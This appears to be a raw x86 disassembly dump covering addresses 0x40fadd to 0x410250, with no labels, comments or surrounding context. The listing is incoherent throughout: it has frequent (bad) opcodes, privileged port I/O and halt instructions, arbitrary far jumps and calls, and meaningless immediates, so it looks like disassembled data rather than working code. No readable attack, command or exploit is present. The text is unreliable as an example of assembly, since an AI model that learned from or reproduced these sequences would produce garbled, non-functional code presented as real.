  40fadd:	(bad)  
  40fade:	pushf  
  40fadf:	jg     0x40faa1
  40fae1:	push   edx
  40fae2:	mov    ecx,0x991b433e
  40fae7:	pop    ebp
  40fae8:	inc    esi
  40fae9:	ds shl ah,cl
  40faec:	inc    ebp
  40faed:	and    BYTE PTR [ebx+0x6ecce968],bh
  40faf3:	or     esi,DWORD PTR [edi+0x38]
  40faf6:	and    eax,0x14506d79
  40fafb:	hlt    
  40fafc:	in     al,dx
  40fafd:	leave  
  40fafe:	xor    eax,0x928cfc14
  40fb03:	and    BYTE PTR [esi],dl
  40fb05:	dec    eax
  40fb06:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fb07:	cmp    ebp,eax
  40fb09:	iret   
  40fb0a:	scas   al,BYTE PTR es:[edi]
  40fb0b:	mov    dl,0x6f
  40fb0d:	xchg   ebp,eax
  40fb0e:	and    dl,BYTE PTR [ebx]
  40fb10:	daa    
  40fb11:	mov    edi,0x763d6626
  40fb16:	cmp    BYTE PTR [ecx+0x6e],dl
  40fb19:	xchg   DWORD PTR [esi+0x7e],ebx
  40fb1c:	cli    
  40fb1d:	pop    es
  40fb1e:	xor    ch,BYTE PTR [eax+edi*2+0x54]
  40fb22:	xchg   BYTE PTR [ecx+ebx*1-0x27],ah
  40fb26:	mov    eax,ds:0x39ecd77e
  40fb2b:	push   ebp
  40fb2c:	push   0xecec2621
  40fb31:	(bad)  
  40fb32:	dec    edi
  40fb33:	std    
  40fb34:	(bad)
  40fb39:	sub    ebx,DWORD PTR [ebx-0xb]
  40fb3c:	ja     0x40fb73
  40fb3e:	inc    eax
  40fb3f:	out    dx,al
  40fb40:	aaa    
  40fb41:	jp     0x40fae5
  40fb43:	or     eax,0xc4336243
  40fb48:	xor    ah,dh
  40fb4a:	into   
  40fb4b:	cld    
  40fb4c:	mov    bl,0xd1
  40fb4e:	inc    esp
  40fb4f:	jmp    0x516f:0x66cae25d
  40fb56:	pop    esp
  40fb57:	mov    ecx,0xce39bcad
  40fb5c:	shl    DWORD PTR [edx-0x7f],0x54
  40fb60:	push   ebx
  40fb61:	std    
  40fb62:	xchg   DWORD PTR [ecx+0x23],ecx
  40fb65:	inc    esi
  40fb66:	push   esp
  40fb67:	addr16 inc eax
  40fb69:	xor    ebp,0x346e9171
  40fb6f:	or     al,0xaf
  40fb71:	sbb    BYTE PTR [ecx+0x13],dl
  40fb74:	out    0x6a,eax
  40fb76:	adc    al,0x5a
  40fb78:	mov    al,ds:0xf20a96d8
  40fb7d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fb7e:	bound  ecx,QWORD PTR [ecx]
  40fb80:	out    dx,al
  40fb81:	adc    dl,ah
  40fb83:	or     eax,0x9d223c85
  40fb88:	inc    ebx
  40fb89:	cmc    
  40fb8a:	loopne 0x40fb88
  40fb8c:	ret    
  40fb8d:	jbe    0x40fbc4
  40fb8f:	cmp    ebp,esi
  40fb91:	std    
  40fb92:	inc    edx
  40fb93:	addr16 ret 
  40fb95:	nop
  40fb96:	mov    bh,0xa3
  40fb98:	ret    0x39a2
  40fb9b:	dec    eax
  40fb9c:	sbb    esi,DWORD PTR [edi]
  40fb9e:	or     DWORD PTR [ebx-0x42],0xbc2ca388
  40fba5:	push   ecx
  40fba6:	dec    eax
  40fba7:	mov    bl,0xda
  40fba9:	inc    edx
  40fbaa:	lea    edx,[edx+0x2013d005]
  40fbb0:	mov    esp,0x53d614bf
  40fbb5:	dec    esi
  40fbb6:	rol    edx,0xdf
  40fbb9:	call   0xf3a8e52e
  40fbbe:	push   eax
  40fbbf:	push   es
  40fbc0:	push   edx
  40fbc1:	mov    DWORD PTR [ecx],ecx
  40fbc3:	jl     0x40fbbc
  40fbc5:	(bad)  
  40fbc6:	sbb    bh,BYTE PTR [eax]
  40fbc8:	sub    DWORD PTR [edx+0x6a33a607],edi
  40fbce:	inc    ebx
  40fbcf:	lea    esi,[esi+ecx*8-0x1261e5e0]
  40fbd6:	lods   eax,DWORD PTR ds:[esi]
  40fbd7:	into   
  40fbd8:	stos   DWORD PTR es:[edi],eax
  40fbd9:	cmp    dh,ah
  40fbdb:	inc    eax
  40fbdc:	inc    edi
  40fbdd:	xchg   ebx,eax
  40fbde:	push   edx
  40fbdf:	nop
  40fbe0:	shr    BYTE PTR [edi+0x165f6fbc],1
  40fbe6:	popa   
  40fbe7:	popf   
  40fbe8:	pop    eax
  40fbe9:	clc    
  40fbea:	in     eax,dx
  40fbeb:	push   ebx
  40fbec:	pop    ebx
  40fbed:	daa    
  40fbee:	mov    eax,0xd756ede9
  40fbf3:	mov    ?,WORD PTR [edi]
  40fbf5:	je     0x40fbd6
  40fbf7:	mov    cl,BYTE PTR [eax-0x58]
  40fbfa:	jnp    0x40fbc1
  40fbfc:	les    ebx,FWORD PTR [edi]
  40fbfe:	add    BYTE PTR [edi-0x6],bh
  40fc01:	paddb  mm5,mm2
  40fc04:	mov    ch,BYTE PTR [ecx]
  40fc06:	and    bh,0x3b
  40fc09:	sahf   
  40fc0a:	mov    cl,0x53
  40fc0c:	pop    ds
  40fc0d:	scas   al,BYTE PTR es:[edi]
  40fc0e:	xchg   ebx,eax
  40fc0f:	push   esi
  40fc10:	test   esp,eax
  40fc12:	test   DWORD PTR [eax],esp
  40fc14:	mov    ds:0xcca41f38,eax
  40fc19:	jnp    0x40fc77
  40fc1b:	in     eax,dx
  40fc1c:	aas    
  40fc1d:	mov    bh,BYTE PTR [eax-0x44]
  40fc20:	outs   dx,DWORD PTR ds:[esi]
  40fc21:	or     DWORD PTR [edx-0x7656ee38],esi
  40fc27:	mov    ch,0xc7
  40fc29:	loope  0x40fc04
  40fc2b:	jae    0x40fc1f
  40fc2d:	add    al,0x7b
  40fc2f:	mov    fs,WORD PTR ds:0xe53d3477
  40fc35:	mov    eax,0x73f9ff71
  40fc3a:	stc    
  40fc3b:	or     BYTE PTR [ebp+edi*2+0x22007cbd],ch
  40fc42:	mov    eax,ds:0xd6f87f09
  40fc47:	cmp    ecx,DWORD PTR [ebx+0x2b]
  40fc4a:	adc    DWORD PTR [edi+0x75],edi
  40fc4d:	les    ebx,FWORD PTR ds:0xc2b5629b
  40fc53:	xor    dh,dh
  40fc55:	(bad)  
  40fc56:	push   cs
  40fc57:	in     eax,0xdb
  40fc59:	in     al,0xe4
  40fc5b:	ret    0x34ab
  40fc5e:	out    dx,al
  40fc5f:	jne    0x40fc8a
  40fc61:	loope  0x40fcb8
  40fc63:	mov    ebx,0x8495dccc
  40fc68:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fc69:	out    dx,al
  40fc6a:	or     edx,DWORD PTR [ebp+0x73f227ee]
  40fc70:	(bad)  
  40fc71:	arpl   WORD PTR ds:0x6e717900,bx
  40fc77:	pop    esp
  40fc78:	push   0xffffffa4
  40fc7a:	mov    WORD PTR [edi-0x76],?
  40fc7d:	pushf  
  40fc7e:	lock or DWORD PTR ds:[ecx],ecx
  40fc82:	xor    dh,BYTE PTR [ecx+0x51]
  40fc85:	test   eax,0xcb8b0c2b
  40fc8a:	push   0xc4c9e551
  40fc8f:	fcom   QWORD PTR [ecx+0x44]
  40fc92:	ja     0x40fc9b
  40fc94:	das    
  40fc95:	inc    edi
  40fc96:	je     0x40fc52
  40fc98:	das    
  40fc99:	pop    ss
  40fc9a:	in     eax,dx
  40fc9b:	or     DWORD PTR [eax+0x60],0xea10498d
  40fca2:	xor    DWORD PTR [eax],ebp
  40fca4:	pop    edx
  40fca5:	and    ebx,ebp
  40fca7:	fwait
  40fca8:	lahf   
  40fca9:	iret   
  40fcaa:	sbb    BYTE PTR [eax],bh
  40fcac:	cdq    
  40fcad:	mov    ebx,ebp
  40fcaf:	int    0x22
  40fcb1:	pop    esi
  40fcb2:	int3   
  40fcb3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fcb4:	adc    BYTE PTR [ebx],dh
  40fcb6:	popf   
  40fcb7:	ins    BYTE PTR es:[edi],dx
  40fcb8:	push   edi
  40fcb9:	adc    bl,bh
  40fcbb:	sub    dl,al
  40fcbd:	std    
  40fcbe:	and    ch,ah
  40fcc0:	fwait
  40fcc1:	dec    esi
  40fcc2:	dec    DWORD PTR [ebp+0x79]
  40fcc5:	iret   
  40fcc6:	xlat   BYTE PTR ds:[ebx]
  40fcc7:	fbstp  TBYTE PTR [ebx-0x40]
  40fcca:	xor    ebp,DWORD PTR [esi+eax*4+0x6e]
  40fcce:	pop    ebp
  40fccf:	sub    cl,BYTE PTR [ebp+0x49d98689]
  40fcd5:	daa    
  40fcd6:	xor    BYTE PTR ds:0xaf44186e,dh
  40fcdc:	fs (bad) 
  40fcdf:	and    edx,ecx
  40fce1:	dec    esp
  40fce2:	loopne 0x40fd0c
  40fce4:	fisttp DWORD PTR [edx+0x6cd0a969]
  40fcea:	or     BYTE PTR [ebx+0x1d],ch
  40fced:	retf   0xd9cf
  40fcf0:	icebp  
  40fcf1:	out    dx,al
  40fcf2:	inc    edi
  40fcf3:	inc    ebp
  40fcf4:	inc    eax
  40fcf5:	gs sbb al,0xea
  40fcf8:	test   al,0x5b
  40fcfa:	add    al,0xf9
  40fcfc:	mov    DWORD PTR [ebp+0x56],edx
  40fcff:	nop    edi
  40fd02:	xor    dl,ch
  40fd04:	fldenv [ebp-0x1a8989cc]
  40fd0a:	add    al,0xb2
  40fd0c:	jmp    0x40fc97
  40fd0e:	int3   
  40fd0f:	add    al,0x3
  40fd11:	push   eax
  40fd12:	xor    eax,0x3e055386
  40fd17:	fist   DWORD PTR [edx+0x3cdf9a6]
  40fd1d:	cmp    BYTE PTR [ecx+0x33a64bc2],al
  40fd23:	dec    ebp
  40fd24:	stos   DWORD PTR es:[edi],eax
  40fd25:	mov    dh,0xd9
  40fd27:	xchg   ebp,eax
  40fd28:	cdq    
  40fd29:	lods   eax,DWORD PTR ds:[esi]
  40fd2a:	cmp    eax,0xeb4577b8
  40fd2f:	cmp    al,0x97
  40fd31:	mov    dh,BYTE PTR [ebp-0xb08bc01]
  40fd37:	call   0x8946b36f
  40fd3c:	mov    bh,0x59
  40fd3e:	adc    bh,BYTE PTR [esi+ecx*1-0x2]
  40fd42:	sub    al,0xea
  40fd44:	lock inc edx
  40fd46:	mov    bl,0x31
  40fd48:	add    al,0x33
  40fd4a:	ss jae 0x40fdb2
  40fd4d:	or     BYTE PTR [edx+0x78],dl
  40fd50:	push   0x7472c176
  40fd55:	fwait
  40fd56:	bound  edi,QWORD PTR [edi+0x69ef31df]
  40fd5c:	adc    ebp,edx
  40fd5e:	and    bh,BYTE PTR [ecx-0x783c5743]
  40fd64:	mov    ebx,0xd21193d4
  40fd69:	xor    dl,al
  40fd6b:	(bad)  
  40fd6c:	popa   
  40fd6d:	test   ah,bl
  40fd6f:	dec    ebp
  40fd70:	sbb    eax,0xd95d929
  40fd75:	add    eax,0x516017ee
  40fd7a:	stos   DWORD PTR es:[edi],eax
  40fd7b:	xchg   ebp,eax
  40fd7c:	mov    esp,0x1b72f6a6
  40fd81:	jecxz  0x40fdc3
  40fd83:	das    
  40fd84:	mov    bl,0xb4
  40fd86:	mov    ah,0x64
  40fd88:	lea    edi,[esi+0x453e55c9]
  40fd8e:	fiadd  DWORD PTR [ebx]
  40fd90:	(bad)  
  40fd91:	(bad)  
  40fd92:	dec    esp
  40fd93:	into   
  40fd94:	icebp  
  40fd95:	outs   dx,BYTE PTR ds:[esi]
  40fd96:	dec    esi
  40fd98:	push   es
  40fd99:	popa   
  40fd9a:	adc    BYTE PTR [ebx],bl
  40fd9c:	pop    ss
  40fd9d:	adc    dl,BYTE PTR [eax+ebp*2]
  40fda0:	push   edx
  40fda1:	out    0xf2,eax
  40fda3:	jb     0x40fdf1
  40fda5:	jl     0x40fd71
  40fda7:	dec    esp
  40fda8:	ins    BYTE PTR es:[edi],dx
  40fda9:	cmp    BYTE PTR [ebp+0x298bd5b3],bl
  40fdaf:	mov    dl,0x41
  40fdb1:	test   esp,edi
  40fdb3:	jp     0x40fd89
  40fdb5:	or     al,0x3a
  40fdb7:	addr16 pop ds
  40fdb9:	push   0x99471530
  40fdbe:	shr    DWORD PTR [esi-0x5fd5e382],0x4f
  40fdc5:	mov    WORD PTR [edx+0xe],gs
  40fdc8:	scas   al,BYTE PTR es:[edi]
  40fdc9:	add    eax,0x87ac0291
  40fdce:	pop    ebp
  40fdcf:	loopne 0x40fda8
  40fdd1:	lods   eax,DWORD PTR ds:[esi]
  40fdd2:	lahf   
  40fdd3:	outs   dx,DWORD PTR ds:[esi]
  40fdd4:	inc    edi
  40fdd5:	ins    BYTE PTR es:[edi],dx
  40fdd6:	sub    eax,DWORD PTR [eax+0x1bcaa4c3]
  40fddc:	fs push ebp
  40fdde:	jle    0x40fe3c
  40fde0:	fadd   DWORD PTR [edi]
  40fde2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fde3:	adc    DWORD PTR [ebp+esi*8-0x2c],ebx
  40fde7:	and    al,0x40
  40fde9:	call   0xe9ce80f0
  40fdee:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fdef:	mov    ah,0x37
  40fdf1:	jae    0x40fdfb
  40fdf3:	push   es
  40fdf4:	cmc    
  40fdf5:	test   DWORD PTR [ebp+0x7d05a668],ebp
  40fdfb:	inc    eax
  40fdfc:	ror    DWORD PTR [eax+0x2c],cl
  40fdff:	push   ds
  40fe00:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fe01:	(bad)  
  40fe02:	hlt    
  40fe03:	fist   DWORD PTR [ebp-0x358686db]
  40fe09:	mov    ecx,?
  40fe0b:	ficomp DWORD PTR [esi]
  40fe0d:	test   DWORD PTR ds:[ebx-0x1709894d],edi
  40fe14:	cmp    esp,0x6553c107
  40fe1a:	inc    ebx
  40fe1b:	idiv   BYTE PTR [edx]
  40fe1d:	scas   al,BYTE PTR es:[edi]
  40fe1e:	xchg   esi,eax
  40fe1f:	popa   
  40fe20:	inc    esi
  40fe21:	add    edx,ecx
  40fe23:	aam    0x21
  40fe25:	push   ebx
  40fe26:	mov    ds:0x95374fd3,eax
  40fe2b:	ja     0x40fe95
  40fe2d:	es inc eax
  40fe2f:	pop    es
  40fe30:	add    DWORD PTR [ebp+0xd],0xfffffff7
  40fe34:	shr    BYTE PTR [ecx-0x40],cl
  40fe37:	aad    0xcd
  40fe39:	cs push edx
  40fe3b:	inc    esi
  40fe3c:	icebp  
  40fe3d:	inc    ebp
  40fe3e:	cli    
  40fe3f:	jnp    0x40fe37
  40fe41:	enter  0x3d56,0x3c
  40fe45:	gs push 0x73007d0c
  40fe4b:	adc    BYTE PTR [edx-0x1e01e5a],bl
  40fe51:	gs (bad) 
  40fe53:	sti    
  40fe54:	adc    al,0x94
  40fe57:	int3   
  40fe58:	xchg   esp,eax
  40fe59:	sub    cl,al
  40fe5b:	test   BYTE PTR ds:0x98188384,0xd0
  40fe62:	les    ebp,FWORD PTR [ecx+eiz*8+0xc9d4cfa]
  40fe69:	ret    0x7103
  40fe6c:	dec    esi
  40fe6d:	(bad)  
  40fe6f:	mul    bl
  40fe71:	add    esp,DWORD PTR [eax+ebx*4-0x1d]
  40fe75:	out    0xd8,al
  40fe77:	jmp    0x40fedf
  40fe79:	xchg   edi,eax
  40fe7a:	mov    al,ds:0xfc09c42f
  40fe7f:	leave  
  40fe80:	jg     0x40feb3
  40fe82:	sbb    al,BYTE PTR [edi+edx*2]
  40fe85:	dec    ebp
  40fe86:	ficom  DWORD PTR [ebx-0x55b3b5a8]
  40fe8c:	push   esi
  40fe8d:	outs   dx,DWORD PTR ds:[esi]
  40fe8e:	gs dec ebp
  40fe90:	popf   
  40fe91:	out    dx,eax
  40fe92:	pop    ss
  40fe93:	dec    edx
  40fe94:	adc    edi,ecx
  40fe96:	mov    ah,0x5b
  40fe98:	cmp    ch,BYTE PTR [eiz*1-0xe24d1d2]
  40fe9f:	ror    DWORD PTR [edi-0x3db9001f],1
  40fea5:	cwde   
  40fea6:	add    edx,edx
  40fea8:	rcr    cl,0x3d
  40feab:	lea    eax,[edi-0x5a9962fc]
  40feb1:	gs mov dh,0x38
  40feb4:	mov    WORD PTR [ebx+0xe],ds
  40feb7:	imul   ecx,DWORD PTR [ecx],0xffffffe0
  40feba:	xchg   edi,eax
  40febb:	and    ecx,edx
  40febd:	jb     0x40fef0
  40febf:	sub    DWORD PTR [ebx],ecx
  40fec1:	ror    DWORD PTR [ecx],1
  40fec3:	mov    al,ds:0x942a066b
  40fec8:	inc    esi
  40fec9:	arpl   WORD PTR [edx+eiz*1+0x46671245],si
  40fed0:	dec    ebx
  40fed1:	retf   0xc763
  40fed4:	jmp    0x40ff35
  40fed6:	sbb    dl,BYTE PTR [ecx-0x6c3d8ef4]
  40fedc:	test   eax,0xabd04181
  40fee1:	sbb    BYTE PTR [edi-0x2b49b42a],cl
  40fee7:	and    eax,DWORD PTR [eax-0x6c]
  40feea:	jo     0x40fef2
  40feec:	addr16 dec ecx
  40feee:	xchg   ecx,eax
  40feef:	push   0x9d4e2ee9
  40fef4:	cmp    eax,0x8fd3caf2
  40fef9:	sub    eax,0xec906ff3
  40fefe:	or     bh,BYTE PTR [ebp-0x110168a8]
  40ff04:	popa   
  40ff05:	xor    al,BYTE PTR [edi-0x13]
  40ff08:	fcomip st,st(2)
  40ff0a:	adc    esi,edx
  40ff0c:	sub    DWORD PTR [eax+0x22],0x698d5bfa
  40ff13:	cmc    
  40ff14:	pop    edx
  40ff15:	add    dh,BYTE PTR ss:[ebp+0x61]
  40ff19:	stc    
  40ff1a:	mov    fs,WORD PTR [esi]
  40ff1c:	imul   eax,DWORD PTR [eax-0x2b],0xffffffb1
  40ff20:	xchg   ecx,eax
  40ff21:	or     ecx,DWORD PTR [ebp-0x7b]
  40ff24:	loop   0x40ff26
  40ff26:	popa   
  40ff27:	xchg   BYTE PTR [edx+0xc3d00cc],ah
  40ff2d:	(bad)  
  40ff2f:	stos   BYTE PTR es:[edi],al
  40ff30:	(bad)  
  40ff31:	(bad)  [edi+0x5f]
  40ff34:	stos   BYTE PTR es:[edi],al
  40ff35:	jns    0x40feb8
  40ff37:	xchg   ecx,eax
  40ff38:	or     al,0x74
  40ff3a:	mov    esp,0xd0f4a616
  40ff3f:	call   0x418b:0x666d30e4
  40ff46:	into   
  40ff47:	shl    BYTE PTR [ecx-0x32ccfec0],1
  40ff4d:	mov    dl,0x15
  40ff4f:	xor    eax,0x2e082ac2
  40ff54:	jnp    0x40ff6c
  40ff56:	xlat   BYTE PTR ds:[ebx]
  40ff57:	hlt    
  40ff58:	and    eax,0xc303498b
  40ff5d:	mov    al,ds:0xa24115dc
  40ff62:	sbb    ch,dl
  40ff64:	nop
  40ff65:	cmp    bh,BYTE PTR ds:0x420100a9
  40ff6b:	test   al,0x55
  40ff6d:	and    al,0x39
  40ff6f:	and    ch,BYTE PTR [ebx]
  40ff71:	aaa    
  40ff72:	push   ds
  40ff73:	jge    0x40ff4d
  40ff75:	sar    DWORD PTR [eax-0x29],cl
  40ff78:	push   ebp
  40ff79:	je     0x40ffe1
  40ff7b:	push   esi
  40ff7c:	add    BYTE PTR [esi],bl
  40ff7e:	mov    BYTE PTR [esp+edx*2],ch
  40ff81:	in     eax,dx
  40ff82:	jnp    0x40ff06
  40ff84:	dec    edx
  40ff85:	cmp    al,ah
  40ff87:	loope  0x40ffe8
  40ff89:	cld    
  40ff8a:	jg     0x40ffa9
  40ff8c:	gs sub eax,0xefe88519
  40ff92:	and    eax,0x3aa26bad
  40ff97:	mov    edx,0x32fac322
  40ff9c:	jbe    0x40ff6c
  40ff9e:	test   BYTE PTR [ecx+ecx*4+0x4a],ah
  40ffa2:	dec    eax
  40ffa3:	or     eax,0xbf5dd823
  40ffa8:	std    
  40ffa9:	in     eax,dx
  40ffaa:	cs jbe 0x40fff7
  40ffad:	xchg   ebp,eax
  40ffae:	jl     0x40ffdc
  40ffb0:	into   
  40ffb1:	aam    0xd8
  40ffb3:	test   BYTE PTR [ecx-0x4],bl
  40ffb6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ffb7:	retf   
  40ffb8:	in     eax,0x9c
  40ffba:	cmp    eax,0x22f5117f
  40ffbf:	and    dl,BYTE PTR [eax+0x38613e36]
  40ffc5:	aam    0x41
  40ffc7:	adc    eax,0x20ab782e
  40ffcc:	mov    esp,0x3b741b38
  40ffd1:	fisub  WORD PTR [edi-0x65]
  40ffd4:	jae    0x410001
  40ffd6:	int3   
  40ffd7:	scas   al,BYTE PTR es:[edi]
  40ffd8:	cs push 0xc3153e0c
  40ffde:	cld    
  40ffdf:	xlat   BYTE PTR ds:[ebx]
  40ffe0:	jg     0x410018
  40ffe2:	cmp    DWORD PTR [edx+0x3fade232],ecx
  40ffe8:	data16 (bad) 
  40ffea:	fdiv   QWORD PTR [ecx+eax*1-0x32]
  40ffee:	cmp    al,0x30
  40fff0:	les    edx,FWORD PTR [esi]
  40fff2:	mov    ds,WORD PTR [ecx-0x38]
  40fff5:	mov    ebx,0xf94cb81c
  40fffa:	dec    ecx
  40fffb:	sti    
  40fffc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fffd:	cmp    DWORD PTR ds:0x2396a525,ebx
  410003:	sti    
  410004:	iret   
  410005:	retf   
  410006:	dec    ebx
  410007:	les    ebx,FWORD PTR [ecx*8-0x238c9015]
  41000e:	addr16 loope 0x410050
  410011:	imul   eax,eax,0x52f2ccfc
  410017:	sahf   
  410018:	mov    edi,0xa81c8d8f
  41001d:	inc    ebp
  41001e:	inc    esp
  41001f:	dec    ebx
  410020:	scas   eax,DWORD PTR es:[edi]
  410021:	mov    esi,0x531c1fe1
  410026:	aad    0xbd
  410028:	mov    ?,WORD PTR [eax+0x67353c0d]
  41002e:	enter  0x62d3,0xc5
  410032:	sub    bl,BYTE PTR [ecx-0x5e]
  410035:	js     0x410075
  410037:	fwait
  410038:	mov    ds:0x6bcd12ea,eax
  41003d:	mov    esi,0xddddf76b
  410042:	cwde   
  410043:	sub    bl,BYTE PTR [ebx]
  410045:	mov    bh,0xdb
  410047:	ffreep st(0)
  410049:	aaa    
  41004a:	or     edi,DWORD PTR [esi-0x6aa56508]
  410050:	sahf   
  410051:	mov    cl,BYTE PTR [esi+0x60]
  410054:	call   DWORD PTR ds:0xde5d0040
  41005a:	push   edx
  41005b:	inc    ecx
  41005c:	addr16 mov esp,0x79683d3
  410062:	mov    al,BYTE PTR [eax]
  410064:	xor    eax,0x8a87ea7f
  410069:	inc    edi
  41006a:	jle    0x4100a9
  41006c:	and    esp,DWORD PTR [ecx+ecx*1+0x495fb6b4]
  410073:	jle    0x4100bc
  410075:	daa    
  410076:	out    0xee,eax
  410078:	mov    dl,0x94
  41007a:	xchg   edx,eax
  41007b:	push   es
  41007c:	inc    edi
  41007d:	out    dx,eax
  41007e:	aaa    
  41007f:	repz cmp eax,0x535f0d53
  410085:	std    
  410086:	adc    ch,BYTE PTR [esi+0x3f984e1]
  41008c:	scas   al,BYTE PTR es:[edi]
  41008d:	ss mov edi,0x19628bc6
  410093:	mov    eax,ds:0x73348d5b
  410098:	xor    al,0x2f
  41009a:	das    
  41009b:	test   ebx,0xa7a2958a
  4100a1:	and    BYTE PTR [ebp+0x1477d39],bl
  4100a7:	dec    ebp
  4100a8:	mov    edi,0xae45ce56
  4100ad:	icebp  
  4100ae:	hlt    
  4100af:	imul   edx,DWORD PTR [edx],0xf1259df9
  4100b5:	nop
  4100b6:	clc    
  4100b7:	mov    ch,0xf4
  4100b9:	sub    DWORD PTR [ecx],0x34
  4100bc:	fstp   QWORD PTR [edx+0x7e]
  4100bf:	in     al,dx
  4100c0:	add    DWORD PTR [edx+esi*2+0x3c],0xffffffa4
  4100c5:	lods   eax,DWORD PTR ds:[esi]
  4100c6:	aas    
  4100c7:	dec    ecx
  4100c8:	sbb    ah,BYTE PTR ds:0x6eac4ba7
  4100ce:	inc    esi
  4100cf:	or     eax,DWORD PTR [esi+0x16235c5e]
  4100d5:	pop    esp
  4100d6:	cmc    
  4100d7:	and    al,BYTE PTR [ebx]
  4100d9:	imul   esi,esi,0xf1dbbbb4
  4100df:	aad    0x5c
  4100e1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4100e2:	sbb    al,0xec
  4100e4:	ss stc 
  4100e6:	dec    esi
  4100e7:	dec    eax
  4100e8:	adc    al,0x36
  4100ea:	pop    di
  4100ec:	and    DWORD PTR [ebx+0x57d0399f],edx
  4100f2:	fnstenv [esi]
  4100f4:	shr    BYTE PTR [ecx-0x4c7ece3e],1
  4100fa:	fcomp  QWORD PTR [eax+0x4c0b6478]
  410100:	mov    bh,bh
  410102:	out    0x1,al
  410104:	outs   dx,DWORD PTR ds:[esi]
  410105:	retf   0x9df3
  410108:	jb     0x410189
  41010a:	cmp    al,0x5a
  41010c:	fdiv   QWORD PTR [eax-0x202d5b78]
  410112:	mov    WORD PTR [ebx-0x5d],ss
  410115:	(bad)  
  410116:	aas    
  410117:	sbb    al,0xaa
  410119:	push   0xbd69856c
  41011e:	out    dx,eax
  41011f:	cli    
  410120:	das    
  410121:	in     al,dx
  410122:	push   ecx
  410123:	test   al,0xf8
  410125:	ror    DWORD PTR ds:0x4ed1c053,0xee
  41012c:	repz leave 
  41012e:	loopne 0x410106
  410130:	fist   DWORD PTR [esi+0x2b]
  410133:	mov    eax,0x3482d93c
  410138:	or     bh,cl
  41013a:	sbb    DWORD PTR [edx],eax
  41013c:	enter  0xbedf,0x7c
  410140:	pop    edi
  410141:	and    eax,0xfab357a
  410146:	or     al,0xb8
  410148:	popa   
  410149:	les    esp,FWORD PTR [ecx+0x6dc3717a]
  41014f:	add    eax,0x2446c233
  410154:	stos   BYTE PTR es:[edi],al
  410155:	jns    0x4100e2
  410157:	mov    esi,0x3ffa3d53
  41015c:	pop    es
  41015d:	les    ecx,FWORD PTR [eax+0x25]
  410160:	outs   dx,DWORD PTR ds:[esi]
  410161:	pop    eax
  410162:	xor    al,0x7f
  410164:	xor    BYTE PTR [ecx+0x64ae31f7],bh
  41016a:	(bad)  
  41016b:	cld    
  41016c:	jae    0x4101b1
  41016e:	into   
  41016f:	and    DWORD PTR [ebp-0x5f260f3],eax
  410175:	rcl    DWORD PTR [ebp-0x28],0xff
  410179:	(bad)  [edi]
  41017b:	dec    esi
  41017c:	dec    eax
  41017d:	repz cdq 
  41017f:	and    edx,ecx
  410181:	or     DWORD PTR [ebx],ebx
  410183:	mov    ch,0xd1
  410185:	xor    DWORD PTR [ebp+0x5b],0x329a574a
  41018c:	or     ebp,DWORD PTR [ecx]
  41018e:	pop    esi
  41018f:	pop    edi
  410190:	jle    0x4101b6
  410192:	and    ah,dh
  410194:	stos   BYTE PTR es:[edi],al
  410195:	push   eax
  410196:	and    DWORD PTR [ebx+esi*4+0x25],edi
  41019a:	loop   0x4101a3
  41019c:	int3   
  41019d:	cld    
  41019e:	xchg   ebp,eax
  41019f:	push   cs
  4101a0:	test   al,0xbb
  4101a2:	icebp  
  4101a3:	(bad)  [eax]
  4101a5:	aas    
  4101a6:	pop    esp
  4101a7:	ins    BYTE PTR es:[edi],dx
  4101a8:	add    edx,edi
  4101aa:	inc    esi
  4101ab:	mov    bl,ch
  4101ad:	mov    edx,0x767c606
  4101b2:	mov    fs,WORD PTR [edi+0x13]
  4101b5:	push   esi
  4101b6:	ins    BYTE PTR es:[edi],dx
  4101b7:	cmp    eax,0x39e77c00
  4101bc:	jmp    0x410147
  4101be:	add    al,0xbd
  4101c0:	test   BYTE PTR [ecx+0x28],dh
  4101c3:	xchg   DWORD PTR [edi+0x26],edi
  4101c6:	repz in al,dx
  4101c8:	addr16 xchg esp,eax
  4101ca:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4101cb:	sbb    DWORD PTR [ebx-0x408bb1f4],edx
  4101d1:	or     al,BYTE PTR [esi-0x6a]
  4101d4:	cmp    eax,0x44638b9e
  4101d9:	and    ch,BYTE PTR ds:0xead3ae7a
  4101df:	loop   0x41019c
  4101e1:	sbb    eax,0x4ec95bb7
  4101e6:	(bad)  
  4101e7:	push   ss
  4101e8:	mov    BYTE PTR [ebx+edi*8],0x20
  4101ec:	sbb    esp,esp
  4101ee:	jecxz  0x410183
  4101f0:	adc    dh,BYTE PTR [edx+0x2853a3a5]
  4101f6:	jmp    0x60eb65eb
  4101fb:	into   
  4101fc:	push   cs
  4101fd:	and    esp,edi
  4101ff:	das    
  410200:	aas    
  410201:	lods   eax,DWORD PTR ds:[esi]
  410202:	jne    0x410200
  410204:	pop    ss
  410205:	retf   0xe6e3
  410208:	je     0x4101fe
  41020a:	dec    ecx
  41020b:	lds    ebx,FWORD PTR [ebx-0x75408e3e]
  410211:	adc    esi,ecx
  410213:	ja     0x4101f7
  410215:	or     al,0x17
  410217:	xchg   ebp,eax
  410218:	es aad 0x5e
  41021b:	xchg   ebx,edx
  41021d:	push   es
  41021e:	pushf  
  41021f:	and    al,0x94
  410221:	shl    BYTE PTR [ebp+0x52],0xde
  410225:	inc    eax
  410226:	cwde   
  410227:	enter  0x5548,0x60
  41022b:	outs   dx,DWORD PTR ds:[esi]
  41022c:	ss ins DWORD PTR es:[edi],dx
  41022e:	imul   ecx,DWORD PTR [edx+0x7c3a38af],0xffffffb4
  410235:	push   0x5300a229
  41023a:	mov    BYTE PTR [ebx],dl
  41023c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41023d:	dec    edx
  41023e:	pop    es
  41023f:	into   
  410240:	aas    
  410241:	cmp    ah,BYTE PTR [ecx-0x6d3442fe]
  410247:	inc    esp
  410248:	jmp    0x4cf6b3c
  41024d:	jp     0x410268
  41024f:	pop    esp
  410250:	(bad)  
